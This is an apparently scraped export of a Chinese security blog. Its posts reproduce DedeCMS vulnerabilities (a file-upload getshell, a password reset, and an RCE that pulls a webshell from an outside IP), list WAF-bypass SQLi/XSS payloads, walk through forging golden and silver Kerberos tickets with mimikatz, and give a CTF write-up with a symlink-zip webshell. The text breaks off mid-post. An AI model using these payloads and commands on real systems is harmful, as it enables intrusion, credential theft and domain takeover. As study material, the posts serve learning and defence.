SP2后台文件上传getshell（CVE-2019-8362）/","link":"","permalink":"https://qingwan.top/2024/01/08/DedeCMS%20v5.7%20SP2%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell%EF%BC%88CVE-2019-8362%EF%BC%89/","excerpt":"Dedecms框架漏洞复现③","text":"Dedecms框架漏洞复现③ 版本影响：Dedecms v5.7 sp2 漏洞原理分析简要的一句话来说这个漏洞的形成原因就是：上传zip文件解压缩时，对于zip文件中的文件后缀过滤不严格，导致getshell 首先分析下源码，我们看到这个路径下的album_add.php文件中对上传的zip文件中图片的过滤 看到对后缀名的过滤这里，看到是用了一个函数 1$fm-&gt;GetMatchFiles($tmpzipdir,&quot;jpg|png|gif&quot;,$imgs); 那我们进入这个函数看一下这里对后缀名的限制主要是由于那个正则表达式，我们来分析一下这个正则 1preg_match(&quot;/\\.(&quot;.$fileexp.&quot;)/i&quot;,$filename) \\.：匹配一个点号（.）。点号在正则表达式中需要转义，因为它是一个特殊字符，表示任意字符的通配符。这个正则表达式的作用是在字符串 $filename 中寻找以 “jpg”、”png” 或 “gif” 为扩展名的文件。如果匹配成功，preg_match() 函数会返回 1，否则返回 0但是这里就有一个bug，就是只要他在我们的文件名中匹配到了.jpg、.png、.gif则视为匹配成功，这样的话我们就可以用1.jpg.php这个格式进行绕过，从而导致任意文件上传 漏洞复现首先官网下载对应版本的源码之后，解压到phpstudy中，然后访问/DedeCMS-V5.7-UTF8-SP2/uploads/install/index.php进行程序的安装，之后登录的用户名和密码都用默认的管理员的admin登录即可然后我们创建一个1.jpg.php文件，里面写入phpinfo或者写入一句话木马 1&lt;?php phpinfo();?&gt; 然后将这个文件压缩上传到文件式管理器的soft目录下 然后我们先去网站栏目管理这里去随便创建一个图片集栏目 创建完成之后，我们访问/DedeCMS-V5.7-UTF8-SP2/uploads/dede/album_add.php，选择从 从ZIP压缩包中解压图片 然后发布，发布成功之后选择预览文档复现成功 漏洞修补这里我一开始想的修补方式是将正则改为，将文件名的最后几个字符和允许的后缀名进行匹配，而不是对整个文件名都进行匹配。然后我看了已经修复的版本，最后的修复方法如下，只有这个函数的定义的最后一句不一样，这里替换了正则用了in_array()函数，函数定义如下 1function in_array(mixed $needle, array $haystack, bool $strict = false): bool &#123;&#125; 这个函数的作用是在 $haystack 数组中搜索是否存在与 $needle 值相等的元素，如果存在则返回 true，否则返回 false。在给定的代码中，in_array() 函数用于判断文件的扩展名是否存在于分割后的扩展名数组中，即 $needle 是文件的扩展名，$haystack是扩展名数组。这里的 1pathinfo($filename, PATHINFO_EXTENSION) 直接取的文件的后缀名去和数组里允许的那三个后缀名进行对比，进而防止了1.jpg.php这种绕过手法 复现过程中问题在我第一次发布的时候，发现一直有报错 1把数据保存到数据库附加表 dede_addonimages 时出错，请把相关信息提交给DedeCMS官方。You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;row,col,isrm,ddmaxwidth,pagepicnum,body) Values(&#x27;4&#x27;,&#x27;2&#x27;,&#x27;&#x27;,&#x27;0.0.&#x27; at line 1 最后通过这篇文章提到的方法解决，主要就是版本问题我们需要给关键字加上反引号","categories":[{"name":"代码审计","slug":"代码审计","permalink":"https://qingwan.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[],"author":"Qingwan"},{"title":"DeDeCMS v5.7 SP2 前台任意用户密码修改漏洞复现","slug":"DeDeCMS v5.7 SP2 前台任意用户密码修改漏洞复现","date":"2024-01-08T07:37:00.246Z","updated":"2024-01-08T07:40:47.603Z","comments":true,"path":"2024/01/08/DeDeCMS v5.7 SP2 前台任意用户密码修改漏洞复现/","link":"","permalink":"https://qingwan.top/2024/01/08/DeDeCMS%20v5.7%20SP2%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","excerpt":"Dedecms框架漏洞复现②","text":"Dedecms框架漏洞复现② 漏洞影响范围DeDeCMS v5.7 SP2 (只影响前台用户) 利用成功前提条件 开启会员模块 攻击者拥有一个正常的会员账号 目标没有设置安全问题 漏洞利用首先下载安装好dedecms v5.7 sp2(tips:我用phpstudy搭建的，这里记得网站php版本调低一点，我一开始用的php7会报错，调成php5就正常了)然后我们点开会员设置，打开会员功能打开会员功能，注册一个账号，这里一定要记住不要设置安全问题查看一下我们刚刚注册的用户的id输入下面这个url，进入修改信息网站，然后抓包localhost/DedeCMS-V5.7-UTF8-SP2/DedeCMS-V5.7-UTF8-SP2/uploads/member/resetpassword.php?dopost=safequestion&amp;safequestion=0.0&amp;safeanswer=&amp;id=2看到这里有个key=Bp7DfL6是临时验证码拿到这个临时key之后就可以修改密码了所以如果我们知道一个会员用户名，并且这个用户没有设置安全问题，同时我们知道他的id，就可以任意修改他的密码了 漏洞分析这里修改用户名密码，有两种方式，一种是通过邮箱验证去修改，另外一种是通过安全问题去修改，这里就是利用了安全问题修改用户名密码的漏洞看到/upload/member/resetpassword.php页面用安全问题验证这里，经过两个if判断之后，就进入了sn函数，这个函数就是我们的修改密码的函数在没有设置安全问题和答案时，safequestion=0，safeanswer=null（为空）所以0.0==0为true，&#39;&#39;==null为true，成功绕过，而且从上图可知，此时的send为Nsn函数的定义如下从之前可知，我们的send为N，则就不发送邮箱验证码，接下来看到newmail这个函数我们来到send为N之后的逻辑，可以看到这里返回了我们漏洞复现中修改密码的url，需要我们的id还有临时验证码key所以最终为：/member/resetpassword.php（safequestion）-&gt; /member/resetpassword.php（sn）-&gt; /member/inc/inc_pwd_functions.php（newmail） 修复建议最后的修复，就是把弱等于==，改为强等于=== 12345678910111213// member/resetpassword.phpelse if($dopost == &quot;safequestion&quot;) &#123; // ... if(empty($safequestion)) $safequestion = &#x27;&#x27;; if(empty($safeanswer)) $safeanswer = &#x27;&#x27;; // TODO: https://xz.aliyun.com/t/1927 已经修复，任意密码重置，弱类型 if ($row[&#x27;safequestion&#x27;] === $safequestion &amp;&amp; $row[&#x27;safeanswer&#x27;] === $safeanswer) &#123; sn($mid, $row[&#x27;userid&#x27;], $row[&#x27;email&#x27;], &#x27;N&#x27;); exit(); &#125; // ...&#125;","categories":[{"name":"代码审计","slug":"代码审计","permalink":"https://qingwan.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[],"author":"Qingwan"},{"title":"DedeCMS v5.81 beta -- common.func.php RCE","slug":"dedecms-common.func.php RCE","date":"2024-01-08T07:33:54.898Z","updated":"2024-03-06T09:57:34.888Z","comments":true,"path":"2024/01/08/dedecms-common.func.php RCE/","link":"","permalink":"https://qingwan.top/2024/01/08/dedecms-common.func.php%20RCE/","excerpt":"Dedecms框架漏洞复现①","text":"Dedecms框架漏洞复现① 漏洞成因漏洞主要的成因在于install/index.php文件的这一段（如果安装初始化了网站，那就是install/index.php.bak这个文件）这里其实涉及到一个Apache解析漏洞 当Apache检测到一个文件有多个扩展名时，如index.php.bak，会从右向左判断，直到有一个Apache认识的扩展名。所以这里的Index.php.bak也会被当作php文件进行解析 首先看到文件开头的If语句 123if (file_exists(INSLOCKFILE)) &#123; exit(&quot; 程序已运行安装，如果你确定要重新安装，请先从FTP中删除 install/install_lock.txt！&quot;); &#125; 由于我们要执行下面的语句，所以我们要想办法绕过这里的exit()这里我们给INSLOCKFILE赋任意值，只要是不存在的文件就可以，当insLockfile指定的文件不存在时程序就会认为没有初始化过，就会继续执行初始化代码。然后我们来到第十一步：step=11 1234567891011121314else if($step==11) &#123; include_once &#x27;../data/admin/config_update.php&#x27;; $rmurl = UPDATEHOST.&quot;dedecms/demodata.&#123;$s_lang&#125;.txt&quot;; $sql_content = file_get_contents($rmurl); $fp = fopen(INSTALL_DEMO_NAME, &#x27;w&#x27;); if(fwrite($fp, $sql_content)) &#123; echo &#x27;&amp;nbsp; &lt;font color=&quot;green&quot;&gt;[√]&lt;/font&gt; 存在(您可以选择安装进行体验)&#x27;; &#125; else &#123; echo &#x27;&amp;nbsp; &lt;font color=&quot;red&quot;&gt;[×]&lt;/font&gt; 远程获取失败&#x27;; &#125; unset($sql_content); fclose($fp); exit(); &#125; 这段代码的作用是从指定URL下载数据并将其写入指定的文件。那如果我们在我们的服务器上，放上一个恶意的文件，然后利用这段代码去下载，那不就可以RCE了嘛 漏洞复现我们先根据指引，初始化网站然后在我们的服务器上先新建一个dedecms文件夹然后在里面新建一个demodata.aaa.txt文件，里面写入一句话木马然后访问链接 1http://localhost/DedeCMS-5.8.1/install/index.php.bak?insLockfile=aaa&amp;step=11&amp;install_demo_name=./a.php&amp;updateHost=http://1.14.60.36:9000/ 之后用户就会下载我们的一句话木马到当前目录下的a.php文件中我们提交参数?updataHost=http://1.14.60.36:9000/ $rumurl就会等于http://1.14.60.36/dedecms/demodata.utf-8.txt（$s_lang等于utf-8或gbk，可以在前端查看，在这里也可以传递一个参数把$s_lang覆盖）。同时提交参数?install_demo_name=./a.php,我们的利用代码就会写在/install/t.php中。 我们访问 1http://localhost/DedeCMS-5.8.1/install/a.php?a=phpinfo(); 即可进行RCE 漏洞修复在安装完成后移除install目录。 参考文章https://www.exploit-db.com/exploits/37423","categories":[{"name":"代码审计","slug":"代码审计","permalink":"https://qingwan.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[],"author":"Qingwan"},{"title":"了解WAF&WAF的绕过","slug":"了解WAF&WAF的绕过","date":"2024-01-08T07:25:29.700Z","updated":"2024-01-12T04:58:20.516Z","comments":true,"path":"2024/01/08/了解WAF&WAF的绕过/","link":"","permalink":"https://qingwan.top/2024/01/08/%E4%BA%86%E8%A7%A3WAF&WAF%E7%9A%84%E7%BB%95%E8%BF%87/","excerpt":"关于一些对WAF的了解以及WAF的绕过","text":"关于一些对WAF的了解以及WAF的绕过 WAF的介绍WAF( Web Application Firewall ) Web应用防火墙，部署在web应用程序前面，在用户请求到达web服务器前对用户请求进行扫描和过滤，分析并校验每个用户请求的网络包，确保每个用户请求有效且安全，对无效或有攻击行为的请求进行阻断或隔离。通过检查HTTP流量，可以防止源自web应用程序的安全漏洞（如注入漏洞、XSS漏洞、命令执行漏洞、文件包含漏洞等）的攻击。 WAF的工作原理WAF的处理流程大致可分为四部分：预处理、规则检测、处理模块、日志记录 1. 预处理预处理阶段首先在接收到数据请求流量时会先判断是否为HTTP&#x2F;HTTPS请求，之后会查看此URL请求是否在白名单之内，如果该URL请求在白名单列表里，直接交给后端Web服务器进行响应处理，对于不在白名单之内的对数据包解析后进入到规则检测部分。 2. 规则检测每一种WAF产品都有自己独特的检测规则体系，解析后的数据包会进入到检测体系中进行规则匹配，检查该数据请求是否符合规则，识别出恶意攻击行为。 3. 处理模块针对不同的检测结果，处理模块会做出不同的安全防御动作，如果符合规则则交给后端Web服务器进行响应处理，对于不符合规则的请求会执行相关的阻断、记录、告警处理。不同的WAF产品会自定义不同的拦截警告页面，在日常渗透中我们也可以根据不同的拦截页面来辨别出网站使用了哪款WAF产品，从而有目的性的进行WAF绕过。这个网站收录了一些常见的WAF产品的界面 4. 日志记录WAF在处理的过程中也会将拦截处理的日志记录下来，方便用户在后续中可以进行日志查看分析。 WAF的分类1.硬件型WAF（产商安装）（绿盟、深信服）：以硬件形式部署在链路中串联在内网的交换机上，防护范围大 2.云WAF（阿里云，腾讯云，华为云….)：通过配置NS或者CNAME记录，使得对网站的请求报文优先经过WAF主机，经过WAF主机过滤之后，将被认为无害的请求报文再送给实际的网站服务器进行请求 （比如学校的第二课堂就用了深信服的云安全产品，不一定是WAF）基于云端的检测，安装简单，修改 DNS 解析或在服务器安装云 WAF 的模块即可 3.软件型WAF（部署在Apache，Nginx等HTTPServer中）（安全狗、D盾、云锁等）以软件的形式安装在服务器上安装在服务器上，根据网站流量决定占用内存量 4.自定义WAF（自己写的一些规则）在系统后台内置一项安全功能以便管理者使用 WAF的判断–工具&#x2F;手动1.sqlmap如果网站有waf的话，我们在使用sqlmap对这个网站进行扫描的时候会有提示（含有很多payload的字典，然后其中有的payload触发了网站的waf，故waf也不一定会被触发）比如： 1python sqlmap.py -u &quot;https://www.cuit.edu.cn/&quot; 2.Wafw00fkali下自带 1wafwoof https://baidu.com 3.手动测试HTTP 请求包分析响应数据通过对网站的正常访问，查看响应的头部信息。例如在 X-Powered-By 内显示 “anyu.qianxin.com” 的标识，代表安装了奇安信安域 WAF比如：这个 网站用了奇安信的产品，我们就可以把他抓包来验证一下 请求恶意字符分析响应或敏感页面比如阿里云盾（aliyundun）我们用一个网站测试一下我们输入一个敏感的路径 1?shopId=&#x27;bin/cat/etc/passwd; ping 127.0.0.1; curl google.com&#x27; 然后可以看到页面出现了阿里云盾的防火墙拦截页面 WAF的绕过检测规则绕过waf工程师规则编写经验、规则覆盖面等问题，来绕过检测，例如利用 MySQL对一些特殊字符处理的特性、语法特性绕过；（但是随着waf的发展，现在在检测规则已经比较全面了，常见的waf一般用这些规则都绕不过去了）1.大小写绕过 1http://example.com/index.php?page_id=-1 UnIoN SeLeCT 1,2,3,4 2.URL编码技术 1被WAF阻止：UniOn(SeLeCt 1,2,3,4,5,6,7,8,9,10)绕过的技术：UniOn%28SeLeCt+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%29 3.Unicode技术 12../../etc/shadow混淆：%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFetc%C0AFshadow 4.HTML编码技术 123&quot;&gt;&lt;img src=x onerror=confirm()&gt;实体名称有效载荷：&amp;quot;&amp;gt;&amp;lt;img src=x onerror=confirm&amp;lpar;&amp;rpar;&amp;gt;实体编码有效载荷：&amp;#34;&amp;#62;&amp;#60;img src=x onerror=confirm&amp;#40;&amp;#41;&amp;#62; 5.使用注释技术 12345&lt;script&gt;confirm()&lt;/script&gt;绕过的技术：&lt;!--&gt;&lt;script&gt;confirm/**/()/**/&lt;/script&gt;被WAF阻止：/?id=1+union+select+1,2--绕过的技术：/?id=1+un/**/ion+sel/**/ect+1,2-- 6.通配符混淆技术 12&lt;iframe/onload=&#x27;this[&quot;src&quot;]=&quot;javascript:confirm()&quot;&#x27;;&gt;混淆负载&lt;iframe/onload=&#x27;this[&quot;src&quot;]=&quot;jav&quot;+&quot;as&amp;Tab;cr&quot;+&quot;ipt:con&quot;+&quot;fir&quot;+&quot;m()&quot;&#x27;;&gt; 7.宽字节 12345union = uю%69яю这里把i不用宽字节 直接url编码 其他的字符都用对应的宽字节select = こхlх%уt //t不编码 其他的都宽字节 中间插上%from = цR%яэ //宽字节+%空格=%20=%ва //в是2的款字符 а是0的宽字符, = Ь //,号的宽字节 8.00截断绕过 1id=1%00and 1=2 union select 1,2,column_name from information_schema.columns 9.溢出waf绕过部分WAF只检测固定大小的内容，可通过添加无用字符进行绕过检测 1234?id=1+and+sleep(3) 绕过payload:?id=1+and+sleep(3)+and+111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111=111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111 10.协议未覆盖绕过以下四种常见的content-type类型： Content-Type:multipart&#x2F;form-data; Content-Type:application&#x2F;x-www-form-urlencoded Content-Type: text&#x2F;xml Content-Type: application&#x2F;json 部分WAF可能只对一种content-type类型增加了检测规则，可以尝试互相替换尝试去绕过WAF过滤机制。例如使用multipart&#x2F;form-data进行绕过。比如：sql第九关，正常情况下绕过之后 boundary边界混淆绕过在首个boundary分隔符号后添加英文逗号和任意干扰字符，且再增加一个boundary分隔符混淆，通过多boundary定义，使WAF检测范围和实际上传范围不一致，从而绕过WAF。 Cookie&#x2F;X-Forwarded-For注入绕过部分WAF可能只对GET，POST提交的参数进行过滤，未对Cookie或者X-Forwarded-For进行检测，可通过cookie或者X-Forwarded-For提交注入参数语句进行绕过。 正常payload： 1234GET /index.aspx?id=1+and+1=1 HTTP/1.1Host: 192.168.61.175Cookie: TOKEN=F6F57AD6473E851F5F8A0E7A64D01E28........... 绕过payload： 12345GET /index.aspx HTTP/1.1Host: 192.168.61.175Cookie:TOKEN=F6F57AD6473E851F5F8A0E7A64D01E28; id=1+and+1=1;X-Forwarded-For:127.0.0.1&#x27;;WAITFOR DELAY&#x27;0:0:5&#x27;--........... 利用pipline进行绕过当请求中的Connection字段值为keep-alive，则代表本次发起的请求所建立的tcp连接不断开，直到所发送内容结束Connection为close为止。部分WAF可能只对第一次传输过来的请求进行过滤处理。正常请求被拦截：利用pipline进行绕过：首先关闭burp的Repeater的Content-Length自动更新修改Connection字段值为keep-alive，将带有攻击语句的数据请求附加到正常请求后面再发送一遍。 分区块传输绕过分区块之后即可绕过 WAF和信息收集的联系WAF可以在信息收集阶段起到一定的作用。它可以检测和阻止一些常见的攻击技术，如SQL注入、跨站脚本（XSS）攻击、跨站请求伪造（CSRF）等。通过阻止这些攻击，WAF可以减少攻击者在信息收集阶段获得有关目标系统的敏感信息的机会。 此外，WAF还可以记录和分析攻击尝试的日志，从中获取有关攻击者的信息，例如攻击来源的IP地址、攻击的目标URL等。这些信息可以用于进一步的安全分析和对策制定。 WAF可以作为信息收集阶段的一种防御措施，帮助减少攻击者对目标系统的了解，并提供一定程度的安全保护。然而，需要注意的是，WAF并不能解决所有的安全问题，因此还需要综合其他安全措施来提高系统的整体安全性。","categories":[{"name":"渗透","slug":"渗透","permalink":"https://qingwan.top/categories/%E6%B8%97%E9%80%8F/"}],"tags":[],"author":"Qingwan"},{"title":"域渗透--黄金票据和白银票据利用实验","slug":"黄金票据和白银票据利用实验","date":"2024-01-08T07:19:10.469Z","updated":"2024-01-08T07:24:41.385Z","comments":true,"path":"2024/01/08/黄金票据和白银票据利用实验/","link":"","permalink":"https://qingwan.top/2024/01/08/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/","excerpt":"关于黄金票据和白银票据的复现","text":"关于黄金票据和白银票据的复现 实验环境 Windows Server 2016（域控机） Windows 10 x64 （域用户机） 票据传递攻击域渗透中的票据传递攻击（Kerberos Ticket Pass-The-Ticket Attack）是一种利用 Kerberos 身份验证系统中的漏洞来获取未授权访问权限的攻击技术。Kerberos 是一种常用的身份验证协议，用于在 Windows 域环境中进行用户认证和授权。 伪造黄金票据黄金票据攻击，针对:AS -&gt; TGT -&gt; ClientClient -&gt; TGT -&gt; TGS我们拿着伪造的TGT（也就是所谓的黄金票据），去请求TGS，然后TGS会给你你想要的访问任何服务的门票 前提条件黄金票据的利用的前提条件是你已经有一个普通域用户的权限，然后也有域内所有账户的hash，这时管理员在域内加固时忘记重置krbtgt的密码，在这些条件下，我们就可以伪造票据，并且利用这个票据去获得域管的权限，利用mimikatz这个工具用krbtgt的hash值去伪造生成任意TGT，所以黄金票据的伪造就相当于伪造TGT。所以需要的条件有：①域名称 ②域的SID ③域的krbtgt账户的hash 信息收集12#获得域名ipconfig /all 12#获得sidwhoami /all 12#然后用mimikatz软件拿到krbtgt用户的NTLM密码哈希 lsadump::dcsync /domian:wanyue.com /user:krbtgt krbtgt用户的NTLM密码hash不会轻易的改变 伪造票据用mimikatz伪造黄金票据并命名为lili 1kerberos::golden /admin:administrator /domain:wanyue.com /sid: S-1-5-21-517629535-2411917366-2305586266-500 /krbtgt:b6d25c8bed7d0d8c5ee8d7c0ae5c8dbf /ticket:ticket.lili 用mimikatz清除票据 12kerberos::purge \\\\清除票据kerberos::tgt \\\\查看票据 然后用mimikatz导入票据，如果ticket失效了，那就再次ptt导入ticket即可 1kerberos::ptt ticket.lili 然后就可以成功访问域控的共享文件夹了 1dir \\\\DC01\\c$ 伪造白银票据白银票据主要伪造的是ST(Service Ticket)，白银票据就针对是:TGS. -&gt; ST -&gt; ClientClient -&gt; ST -&gt; Service伪造出一张ST，就不用等TGS去发门票了，就可以自己去访问特点服务了黄金票据的攻击范围比白银票据的更广，因为在TGT已经在PAC里限定了给Client授权的服务（通过SID的值），所以银票只能访问指定服务。黄金票据是伪造TGT并且有效的获得任何Kerberos服务，而白银票据是伪造TGS。这意味着白银票据仅限于特定服务器上的任何服务。 前提条件123451.域名称 2.域的SID值 3.域中的Server服务器账户的NTLM-Hash 4.伪造的用户名，可以是任意用户名. 5.目标服务器上面的kerberos服务 信息收集12#拿到域控Ip和域名ipconfig /all 12#拿到SIDwhoami /all 123#用mimikatz导出域控的hashprivilege::debugsekurlsa::logonpasswords f125f3b9bf38df68580ed48019942360 伪造票证先用mimikat删除票据，然后再替换相应数据伪造票据 12345kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域 SID&gt; /target:&lt;目标服务器主机名&gt; /service:&lt;服务类型&gt; /rc4:&lt;NTLMHash&gt; /user:&lt;用户名&gt; /ptt#这里的用户名可以随便写kerberos::golden /domain:wanyue.com /sid:S-1-5-21-517629535-2411917366-2305586266-500/target:OWA2010SP3.0day.org /service:cifs /rc4:f125f3b9bf38df68580ed48019942360 /user:silver /ptt 访问域控文件成功 黄金票据和白银票据的区别黄金票据（Golden Ticket）：攻击方式： 黄金票据攻击是通过直接抓取域控制器上 krbtgt 账户的哈希，然后在客户端生成一个伪造的 TGT 票据（门票发放票）。要和KDC交互，但是不和AS交互。凭据类型： 黄金票据攻击使用 krbtgt 账户的 NTLM 哈希来生成伪造的 TGT。攻击者在获取域管理员或域控制器凭据后，可以生成具有完全访问权限的伪造票据。影响范围： 黄金票据允许攻击者以伪造的身份访问域中的任何系统和服务，绕过身份验证过程，并操纵整个域环境。它对所有机器的所有服务都有效。 白银票据（Silver Ticket）：攻击方式： 白银票据攻击是在客户端利用已获取的域控制器服务账户的哈希来生成伪造的服务票据（ST 票据）。不和KDC交互，直接访问Server。凭据类型： 白银票据攻击使用服务账户的 NTLM 哈希来生成伪造的服务票据。攻击者在获取服务账户凭据后，可以生成伪造的服务票据，并通过它来访问受信任的服务。影响范围： 白银票据攻击允许攻击者以伪造的服务身份访问域中的受信任服务，而无需提供真实的凭据。但是，伪造的门票只对部分服务起作用，如文件共享服务（CIFS）、MSSQL、WinRM（Windows远程管理）、DNS等。 总结来说，黄金票据攻击直接抓取 krbtgt 账户的哈希，在客户端生成完全权限的伪造 TGT 票据，对所有机器的所有服务有效。而白银票据攻击利用已获取的服务账户的哈希 ，在客户端生成伪造的服务票据，对部分服务起作用，并且更加隐蔽，因为伪造的门票不经过 KDC。 黄金票据攻击和白银票据攻击主要是作用是权限维持，简单的意思就是，理论上，拿着这个票据，无论别人怎么查杀你，但是你还是可以靠着这张票据杀回去，然后拿着当初造的那张黄金票据随时回来接管域控的权限。","categories":[{"name":"渗透","slug":"渗透","permalink":"https://qingwan.top/categories/%E6%B8%97%E9%80%8F/"}],"tags":[],"author":"Qingwan"},{"title":"2023国赛初赛复现wp--web","slug":"2023国赛wp","date":"2024-01-08T06:50:24.408Z","updated":"2024-01-08T07:11:29.446Z","comments":true,"path":"2024/01/08/2023国赛wp/","link":"","permalink":"https://qingwan.top/2024/01/08/2023%E5%9B%BD%E8%B5%9Bwp/","excerpt":"2023国赛初赛web","text":"2023国赛初赛web Unzip打开是一个文件上传界面这道题似乎是个原题先搜索一下题目，unzip，发现是Linux下用于解压压缩包的一个命令打开环境是一个文件上传页面先随便上传一个文件，点击上传之后会跳转到upload.php 12345678910 &lt;?phperror_reporting(0);highlight_file(__FILE__);$finfo = finfo_open(FILEINFO_MIME_TYPE);if (finfo_file($finfo, $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]) === &#x27;application/zip&#x27;)&#123; exec(&#x27;cd /tmp &amp;&amp; unzip -o &#x27; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);&#125;;//only this! 分析一下这段源码 1234567if (finfo_file($finfo, $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]) === &#x27;application/zip&#x27;)&#123; //finfo_file()函数用于验证MIME值，这里确定了要上传的文件类型为zip exec(&#x27;cd /tmp &amp;&amp; unzip -o &#x27; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]); //这里的意思是进入/tmp目录下后，调用unzip命令对压缩包进行解压 //-o 表示不必先询问用户，unzip执行后覆盖原有文件。&#125;; 总的意思就是，我们只能上传zip文件，并且上传之后zip文件会解压到&#x2F;tmp目录下，并且会覆盖原有文件那这样我们的思路就简单了，上传一个带有马的压缩包，然后再getshell即可但是上传之后却发现，我们不能访问&#x2F;tmp目录，所以我们就要进行绕过那绕过思路大概就是，有一个操作可以让我们对一个文件操作时让他作用在另一个目录或者文件下 软链接&#x2F;硬链接12345硬链接指通过索引节点来进行连接。比如：A 是 B 的硬链接（A 和 B 都是文件名），则 A 的目录项中的 inode 节点号与 B 的目录项中的 inode 节点号相同，即一个 inode 节点对应两个不同的文件名，两个文件名指向同一个文件，A 和 B 对文件系统来说是完全平等的。删除其中任何一个都不会影响另外一个的访问。创建命令 ： ln+原始文件 + 硬链接重命名文件软链接也叫符号链接。在符号连接中，文件实际上是一个文本文件，其中包含的有另一文件的位置信息。相当于创建一个快捷方式，记录原文件的位置，原文件删除，则该文件无法访问，有主次之分。就是可以将某个目录连接到另一个目录或者文件下，那么我们以后对这个目录的任何操作，都会作用到另一个目录或者文件下。创建命令 ： ln -s 原始文件路径 软链接后的路径 由上面可知我们这里需要用到软链接，那这样思路就清晰了，首先我们先上传一个带有软链接的压缩包(1.zip)，然后让其指向网站的根目录（&#x2F;var&#x2F;www&#x2F;html)，这样我们就可以通过访问该文件直接访问网站的目录了，然后我们再上传一个带有木马的压缩包(2.zip)，他的目录为1.zip的目录下。下面是具体实现： 软链接的利用和实现12345//创建软链接的压缩包，在linux命令行下输入下面的内容mkdir 1 //先创建一个目录来用于创建软链接cd 1ln -s /var/www/html QW //创建了一个名为QW的符号链接，该链接指向 /var/www/html 目录。zip --symlinks 1.zip QW //将QW目录及其所有内容压缩成一个名为 1.zip 的 ZIP 文件。 123456//创建包含木马文件的压缩包mkdir QW //这里创建的文件夹要和1.zip里的目录名一样cd QWecho &quot;&lt;?php eval(\\$_POST[1]);?&gt;&quot; &gt; shell.php //在该目录下写入shell.php文件，内容为一句话木马cd .. //返回QW的上级目录zip -r 2.zip QW //将该目录压缩为2.zip文件 然后先上传1.zip文件，再上传2.zip文件，然后再getshell即可 12http://1.xx.xx.x:12345/shell.php //访问shell.php文件1=system(&quot;cat /flag&quot;); //同时post传参，得到flag flag{8382843b-d3e8-72fc-6625-ba5269953b23} gosession打开环境，显示 1Hello, guest 打开附件，查看main.go文件，发现主要有三个路由 Index Admin Flask123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778//rount.gopackage route import ( &quot;github.com/flosch/pongo2/v6&quot; &quot;github.com/gin-gonic/gin&quot; &quot;github.com/gorilla/sessions&quot; &quot;html&quot; &quot;io&quot; &quot;net/http&quot; &quot;os&quot; ) var store = sessions.NewCookieStore([]byte(os.Getenv(&quot;SESSION_KEY&quot;))) func Index(c *gin.Context) &#123; session, err := store.Get(c.Request, &quot;session-name&quot;) if err != nil &#123; http.Error(c.Writer, err.Error(), http.StatusInternalServerError) return &#125; if session.Values[&quot;name&quot;] == nil &#123; session.Values[&quot;name&quot;] = &quot;guest&quot; err = session.Save(c.Request, c.Writer) if err != nil &#123; http.Error(c.Writer, err.Error(), http.StatusInternalServerError) return &#125; &#125; c.String(200, &quot;Hello, guest&quot;) &#125; func Admin(c *gin.Context) &#123; session, err := store.Get(c.Request, &quot;session-name&quot;) if err != nil &#123; http.Error(c.Writer, err.Error(), http.StatusInternalServerError) return &#125; if session.Values[&quot;name&quot;] != &quot;admin&quot; &#123; http.Error(c.Writer, &quot;N0&quot;, http.StatusInternalServerError) return &#125; name := c.DefaultQuery(&quot;name&quot;, &quot;ssti&quot;) xssWaf := html.EscapeString(name) tpl, err := pongo2.FromString(&quot;Hello &quot; + xssWaf + &quot;!&quot;) if err != nil &#123; panic(err) &#125; out, err := tpl.Execute(pongo2.Context&#123;&quot;c&quot;: c&#125;) if err != nil &#123; http.Error(c.Writer, err.Error(), http.StatusInternalServerError) return &#125; c.String(200, out) &#125; func Flask(c *gin.Context) &#123; session, err := store.Get(c.Request, &quot;session-name&quot;) if err != nil &#123; http.Error(c.Writer, err.Error(), http.StatusInternalServerError) return &#125; if session.Values[&quot;name&quot;] == nil &#123; if err != nil &#123; http.Error(c.Writer, &quot;N0&quot;, http.StatusInternalServerError) return &#125; &#125; resp, err := http.Get(&quot;http://127.0.0.1:5000/&quot; + c.DefaultQuery(&quot;name&quot;, &quot;guest&quot;)) if err != nil &#123; return &#125; defer resp.Body.Close() body, _ := io.ReadAll(resp.Body) c.String(200, string(body)) &#125; 可以看到，Index路由中的session是guest用户的session，然后session_key是通过SESSION_KEY环境变量获取的Admin路由就是检测session，检测成功之后就ssti（需要name值为admin)，用xsswaf过滤了！并且里面调用了 pongo2 来实现模版解析Flask路由可以访问到本机5000端口的flask服务访问：1234567891011http://xxx/flask?name=//使name的值为空，会报错，信息泄露得到5000端口的源码，把得到的html源码去运行一下，得到下面的信息//这里为什么为空会报错？报错会得到源码呢？我在这道题的wp最后会做出解释。 // /app/server.py app = Flask(__name__) @app.route(&#x27;/&#x27;) def index(): name = request.args[&#x27;name&#x27;] return name + &quot; no ssti&quot; if __name__ == &quot;__main__&quot;: app.run(host=&quot;127.0.0.1&quot;, port=5000, debug=True) 这里看到flask开启了debug模式，等会要利用这个点,debug开启,代表开启了热加载功能，简单来说,就是允许在对代码进行更改后自动重新加载应用程序。os.Getenv 